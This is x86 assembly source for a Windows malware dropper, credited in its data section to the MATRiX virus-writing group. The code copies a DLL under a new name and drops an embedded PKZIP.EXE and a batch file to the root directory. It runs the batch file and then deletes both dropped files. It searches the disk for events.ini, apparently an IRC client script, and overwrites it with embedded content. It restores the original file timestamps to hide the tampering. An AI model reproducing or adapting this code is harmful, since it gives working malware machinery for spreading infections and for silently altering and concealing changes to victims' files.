     .586p
     .model flat
     locals
     jumps

     ; KERNEL32.DLL

     extrn ExitProcess:proc
     extrn GetWindowsDirectoryA:proc
     extrn lstrcat:proc
     extrn CopyFileA:proc
     extrn GetFileSize:proc
     extrn CloseHandle:proc
     extrn DeleteFileA:proc
     extrn WinExec:proc
     extrn CreateFileA:proc
     extrn GetFileTime:proc
     extrn CreateFileMappingA:proc
     extrn MapViewOfFile:proc
     extrn CloseHandle:proc
     extrn UnmapViewOfFile:proc
     extrn SetEndOfFile:proc
     extrn SetFilePointer:proc
     extrn SetFileTime:proc
     extrn Sleep:proc

     ; IMAGEHLP.DLL

     extrn SearchTreeForFile:proc

     ; USER32.DLL

     extrn MessageBoxA:proc

     .code

start:

     ; copy win32.dll under other name

     push 260
     mov esi,offset outputpath
     push esi
     call GetWindowsDirectoryA

     push eax
     push esi
     push offset thepath2
     call lstrcat

     pop eax
     push eax
     add esi,eax
     xchg edi,esi
     mov eax,'NIW\'
     stosd
     mov eax,'D.23'
     stosd
     mov eax,'LL'
     stosd
     pop eax
     mov edi,offset thepath2
     add edi,eax
     mov eax,'TAM\'
     stosd
     mov eax,'_XiR'
     stosd
     mov eax,'IVOM'
     stosd
     mov eax,'CS.E'
     stosd
     mov eax,'R'
     stosd

     push 0
     push offset thepath2
     push offset outputpath
     call CopyFileA

     ; copy the pkzip to root directory

     mov [filesize], PKZIP_SIZE
     mov eax,offset pkzipexe
     call create
     mov edi,eax
     test eax,eax
     jz start2

     call pkzip

     include pkzip.inc

pkzip:
     pop esi
     mov ecx, PKZIP_SIZE
     rep movsb
     call unmap

start2:

     mov [filesize], BAT_SIZE
     mov eax,offset plugbat
     call create
     mov edi,eax
     test eax,eax
     jz start3
     call plugzip

     include plugzip.inc

plugzip:
     pop esi
     mov ecx, BAT_SIZE
     rep movsb

     call unmap

     ; play PLUGBAT

     push 1
     push offset plugbat
     call WinExec

     push 5000
     call Sleep

     ; and delete

     push offset plugbat
     call DeleteFileA

     push offset pkzipexe
     call DeleteFileA

     ; let's locate events.ini

start3:

     push offset outputpath
     push offset eventsini
     push offset rootpath
     call SearchTreeForFile

     test eax,eax
     jz start4

     ; now we have to open the events.ini file and replace with
     ; our information

     mov eax,offset outputpath
     mov [filesize], EVENTS_SIZE
     call open
     mov edi,eax
     test eax,eax
     jz start4

     call events
     
     include events.inc

events:
     pop esi
     mov ecx, EVENTS_SIZE
     rep movsb
     call unmap

start4:

exit_x:

     push 0
     call ExitProcess

open:

     push 0
     push 0
     push 3
     jmp short opecre

create:

     push 0
     push 0
     push 2

opecre:

     push 0
     push 1
     push 80000000h or 40000000h
     push eax
     call CreateFileA

     mov [handle],eax
     inc eax
     jz ebc
     dec eax

     ; Salve info. about the file

     mov eax,offset time
     push eax
     add eax,8
     push eax
     add eax,8
     push eax
     push [handle]
     call GetFileTime

     push 0
     push [filesize]
     push 0
     push 4
     push 0
     push [handle]
     call CreateFileMappingA

     mov [handle2],eax
     test eax,eax
     jz eac

     push [filesize]
     push 0
     push 0
     push 2
     push [handle2]
     call MapViewOfFile

     ; Return address in eax

     mov [mem_addr],eax 
     test eax,eax
     jz cbm
     ret

unmap:

     push [mem_addr]
     call UnmapViewOfFile
cbm:

     push [handle2]
     call CloseHandle

     push 0
     push 0
     push [filesize]
     push [handle]
     call SetFilePointer

     push [handle]
     call SetEndOfFile

eac:

     mov eax,offset time
     push eax
     add eax,8
     push eax
     add eax,8
     push eax
     push [handle]
     call SetFileTime

     push [handle]
     call CloseHandle

ebc:

     xor eax,eax
     ret

.data?

outputpath db 260 dup (0)
thepath2  db 260 dup (0)
handle dd 0
handle2 dd 0
mem_addr dd 0
filesize dd 0
time      dd 0,0,0,0,0,0

.data

copyright db 'Software provide by [MATRiX] team:',0dh,0ah
          db 'Ultras, Mort, Nbk, Tgr, Del_Armg0, Anaktos',0dh,0ah
          db 'Greetz:',0d,0ah
          db 'Vecna 4 source codes and ideas,',0dh,0ah,0
eventsini db 'events.ini',0
scriptini db 'script.ini',0
rootpath  db '\',0
pkzipexe  db '\PKZIP.EXE',0
plugbat   db '\PLUGZIP.BAT',0

EVENTS_SIZE EQU 1663
BAT_SIZE EQU 1229
PKZIP_SIZE EQU 50663

end start
